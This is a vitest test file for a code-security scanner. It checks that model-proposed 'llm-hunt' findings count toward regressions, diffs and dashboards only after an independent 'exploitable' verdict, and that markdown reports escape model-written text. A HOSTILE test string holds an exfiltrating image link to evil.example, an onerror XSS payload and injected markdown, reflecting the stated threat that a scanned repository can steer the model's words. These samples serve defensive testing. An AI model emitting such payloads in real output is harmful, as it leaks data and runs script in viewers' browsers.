/**
 * US-2.AC-5 beyond the open set: the paths that read one scan's rows directly
 * — `regression_alert`, `diff_scans`, the dashboard's deltas, the
 * `guardian://scans/{scan_id}` resource and the report — never count an
 * `llm-hunt` candidate that no INDEPENDENT `exploitable` verdict confirmed.
 * A confirmed one counts like any finding. (Task 6 review, round 1.)
 *
 * And the markdown report prints model-written text inert: a repository under
 * scan can steer the model's words, so a newline, an image, a link or raw HTML
 * in a verdict must not become markup.
 */

import { readFileSync } from 'node:fs';
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest';
import { buildSnapshot } from '../../src/dashboard/snapshot.js';
import { toFindingValidation } from '../../src/llmscan/submission.js';
import type { Independence, LlmVerdict } from '../../src/llmscan/types.js';
import { RESOURCES } from '../../src/resources/index.js';
import type { Storage } from '../../src/storage/index.js';
import { mdInline } from '../../src/tools/reportExport.js';
import { callTool, harness, seedScan, type Harness, type SeedSpec } from '../helpers/llmScanHarness.js';
import { cleanupTempDirs } from '../helpers/tempDir.js';
import { okResult } from '../helpers/toolResult.js';

vi.setConfig({ testTimeout: 60_000 });
afterAll(cleanupTempDirs);
beforeAll(async () => {
  await import('../../src/registerAll.js');
});

function verdict(storage: Storage, project: string, fingerprint: string, v: LlmVerdict, independence: Independence, reasoning = 'Followed the value.'): void {
  storage.validations.upsert(project, [
    toFindingValidation({
      fingerprint,
      verdict: v,
      independence,
      decisive_line: 'src/routes/admin.ts:5 — no role check',
      reasoning,
      prompt_version: 'v1',
      tree_hash: 'tree-under-test',
      computed_at: '2026-10-02T12:00:00.000Z',
    }),
  ]);
}

const hunt = (file: string, line: number): SeedSpec => ({
  tool: 'llm-hunt',
  rule_id: 'broken-access-control',
  severity: 'high',
  loc: { file, line },
  title: 'Admin route without a role check',
});

/**
 * Two `llm_scan` scans of one project: the older holds nothing, the newer two
 * hunt findings — `open` with no verdict (or a non-confirming one), and
 * `confirmed` with an independent `exploitable`.
 */
function twoHuntScans(openVerdict?: { v: LlmVerdict; independence: Independence }): {
  h: Harness;
  older: string;
  newer: string;
  open: string;
  confirmed: string;
} {
  const h = harness();
  const older = seedScan(h.storage, h.db, h.project, 'llm_scan', [], [{ name: 'llm-hunt', status: 'ok' }]).scanId;
  const { scanId: newer, findings } = seedScan(
    h.storage,
    h.db,
    h.project,
    'llm_scan',
    [hunt('src/routes/admin.ts', 5), hunt('src/routes/files.ts', 9)],
    [{ name: 'llm-hunt', status: 'ok' }],
  );
  const [open, confirmed] = findings;
  if (open === undefined || confirmed === undefined) throw new Error('seeding failed');
  verdict(h.storage, h.project, confirmed.fingerprint, 'exploitable', 'subagent');
  if (openVerdict !== undefined) verdict(h.storage, h.project, open.fingerprint, openVerdict.v, openVerdict.independence);
  return { h, older, newer, open: open.fingerprint, confirmed: confirmed.fingerprint };
}

const UNCONFIRMING: Array<{ v: LlmVerdict; independence: Independence } | undefined> = [
  undefined,
  { v: 'not_exploitable', independence: 'subagent' },
  { v: 'exploitable', independence: 'same_context' },
  { v: 'undetermined', independence: 'sampling' },
];

describe('US-2.AC-5: an unconfirmed llm-hunt candidate moves no total, diff, score or gate', () => {
  it.each(UNCONFIRMING)('regression_alert counts only the confirmed one (open verdict: %o)', async (openVerdict) => {
    const { h } = twoHuntScans(openVerdict);
    const r = okResult<{ regressed: boolean; score_delta: number; new_findings_by_severity: Record<string, number> }>(
      await callTool(h, 'regression_alert', { project_path: h.project, threshold: 100 }),
    );
    // One high is new (the confirmed one), never two.
    expect(r.new_findings_by_severity['high']).toBe(1);
  });

  it('regression_alert: a scan holding only an unconfirmed candidate is no regression', async () => {
    const h = harness();
    seedScan(h.storage, h.db, h.project, 'llm_scan', [], [{ name: 'llm-hunt', status: 'ok' }]);
    seedScan(h.storage, h.db, h.project, 'llm_scan', [hunt('src/routes/admin.ts', 5)], [{ name: 'llm-hunt', status: 'ok' }]);
    const r = okResult<{ regressed: boolean; score_delta: number }>(await callTool(h, 'regression_alert', { project_path: h.project, threshold: 0 }));
    expect(r.regressed).toBe(false);
    expect(r.score_delta).toBe(0);
  });

  it.each(UNCONFIRMING)('diff_scans lists only the confirmed one as new (open verdict: %o)', async (openVerdict) => {
    const { h, older, newer, open, confirmed } = twoHuntScans(openVerdict);
    const r = okResult<{ summary: { new: number }; new_findings: Array<{ fingerprint: string }> }>(
      await callTool(h, 'diff_scans', { project_path: h.project, from_scan_id: older, to_scan_id: newer }),
    );
    expect(r.summary.new).toBe(1);
    expect(r.new_findings.map((f) => f.fingerprint)).toEqual([confirmed]);
    expect(r.new_findings.map((f) => f.fingerprint)).not.toContain(open);
  });

  it('the dashboard since_previous counts only the confirmed one as new', () => {
    const { h } = twoHuntScans();
    const snap = buildSnapshot(h.storage, h.project, Date.now());
    expect(snap.deltas.since_previous).toMatchObject({ new_count: 1 });
  });

  it('guardian://scans/{scan_id} counts only the confirmed one', async () => {
    const { h, newer, open } = twoHuntScans();
    const resource = RESOURCES.find((r) => r.name === 'guardian-scans-by-id');
    if (resource === undefined) throw new Error('guardian-scans-by-id is not registered');
    const r = await resource.handler(new URL(`guardian://scans/${newer}`), { scan_id: newer }, h.plugin);
    const json = r.json as { findings_count_by_severity: Record<string, number>; top_findings: Array<{ fingerprint: string }> };
    expect(json.findings_count_by_severity['high']).toBe(1);
    expect(json.top_findings.map((f) => f.fingerprint)).not.toContain(open);
  });
});

describe('the markdown report prints model-written text inert', () => {
  const HOSTILE = 'Safe.\n# Injected heading\n- injected item ![x](https://evil.example/?leak=1) <img src=x onerror=alert(1)> [click](https://evil.example) **bold** `code` | cell';

  it('mdInline: one line, and no markup a viewer acts on', () => {
    const out = mdInline(HOSTILE);
    expect(out).not.toMatch(/\n/);
    expect(out).not.toContain('![');
    expect(out).not.toMatch(/(?<!\\)<img/);
    expect(out).not.toMatch(/(?<!\\)\[click\]/);
    expect(out).not.toMatch(/(?<!\\)\*\*bold/);
    expect(out).toContain('\\!\\[x\\]');
    expect(out).toContain('\\<img');
    expect(mdInline('x'.repeat(5000)).length).toBeLessThan(2100);
  });

  it('report_export (markdown): a hostile reasoning stays on its line, escaped', async () => {
    const { h, newer, confirmed } = twoHuntScans();
    verdict(h.storage, h.project, confirmed, 'exploitable', 'subagent', HOSTILE);
    const out = okResult<{ file_path: string }>(
      await callTool(h, 'report_export', { project_path: h.project, scan_id: newer, format: 'markdown' }),
    );
    const md = readFileSync(out.file_path, 'utf8');
    expect(md).not.toMatch(/^# Injected heading/m);
    expect(md).not.toMatch(/^- injected item/m);
    expect(md).not.toContain('![x](');
    expect(md).not.toMatch(/(?<!\\)<img src=x/);
    expect(md).toMatch(/^ {2}- Reasoning: Safe\. \\# Injected heading - injected item \\!\\\[x\\\]/m);
  });
});
